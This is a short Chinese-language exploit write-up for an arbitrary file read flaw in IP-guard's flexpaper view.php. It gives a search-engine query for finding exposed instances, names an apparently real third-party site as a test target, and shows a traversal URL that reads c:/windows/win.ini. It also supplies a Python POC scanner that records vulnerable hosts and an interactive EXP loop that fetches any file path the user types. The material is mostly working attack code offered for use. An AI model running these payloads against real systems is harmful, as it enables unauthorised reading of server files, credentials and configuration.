## 一、资产搜索

```
"IP-guard" && icon_hash="2030860561"
```

## 二、网站测试

```
http://pm.binhong-tech.top
```

## 三、验证漏洞

```
/ipg/static/appr/lib/flexpaper/php/view.php?doc=c:/windows/win.ini&format=pdf&page=
```

![image-20240914195256686](https://imagescf.oss-cn-beijing.aliyuncs.com/img/image-20240914195256686.png)

## 四、POC

```
def poc(target):
    payload = "/ipg/static/appr/lib/flexpaper/php/view.php?doc=c:/windows/win.ini&format=pdf&page="
    try:
        res1 = requests.get(url=target,verify=False,timeout=5)
        if res1.status_code == 200:
            res2 = requests.get(url=target+payload,verify=False,timeout=5)
            if "fonts" in res2.text:
                with open("result.txt","a",encoding="utf-8") as f:
                    f.write(f"该网站[+]{target}存在任意文件读取漏洞\n")
                    return True
            else:
                print(f"该网站[+]{target}不存在任意文件读取漏洞")
        else:
            print(f"该网站[+]{target}有问题，请手动测试！！")
    except Exception as e:
        print(e)
```

## 五、EXP

```
def exp(target):
    while True:
        content = input("请输入要查看的路径，从C:目录开始输入(q退出)\n>>>>>>>>>>>>>>>>>>")
        payload = f"/ipg/static/appr/lib/flexpaper/php/view.php?doc={content}&format=pdf&page="
        res1 = requests.get(url=target, verify=False,timeout=5)
        if content == "q":
            exit()
        if res1.status_code == 200:
            res2 = requests.get(url=target + payload, verify=False, timeout=5)
            print(res2.text)
        else:
            print("该文件不存在，请重新输入！！")
```

## 六、测试结果

![image-20240914195525411](https://imagescf.oss-cn-beijing.aliyuncs.com/img/image-20240914195525411.png)

![image-20240914195747070](https://imagescf.oss-cn-beijing.aliyuncs.com/img/image-20240914195747070.png)